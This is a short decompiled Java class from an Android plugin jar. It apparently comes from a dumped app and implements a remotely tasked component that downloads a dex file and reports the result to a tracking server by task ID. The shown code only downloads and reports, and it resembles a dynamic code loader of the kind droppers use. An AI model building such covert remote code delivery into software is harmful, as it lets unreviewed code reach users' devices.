package com.hs.cld.da;

import android.content.Context;
import com.hs.cld.da.model.DexBean;
import com.hs.cld.da.model.EventTypeEnum;
import com.hs.p.common.utils.LOG;
import com.hs.p.dx.DIR;

/* JADX INFO: loaded from: /Users/ruben/projector-dump/downloads/plugin.jar */
public class DexExe extends RemoteExe {
    private static final String TAG = "DE";

    public DexExe(Context context, DexBean dexBean) {
        super(context, dexBean);
    }

    private void handle() throws Exception {
        try {
            download(DIR.dxRf());
            submitTracker(EventTypeEnum.DOWNLOADED, 0, "OK");
        } catch (Exception e) {
            if (e.getMessage() == null || !e.getMessage().contains("file exist")) {
                LOG.e(TAG, "[" + this.mTrackerBean.task_id + "] de failed: " + e);
                EventTypeEnum eventTypeEnum = EventTypeEnum.DOWNLOADED;
                StringBuilder sb = new StringBuilder();
                sb.append("");
                sb.append(e);
                submitTracker(eventTypeEnum, 1, sb.toString());
            } else {
                LOG.i(TAG, "[" + this.mTrackerBean.task_id + "] dex file already exists with same MD5: " + e.getMessage());
            }
            throw e;
        }
    }

    public void fire() throws Exception {
        handle();
    }
}
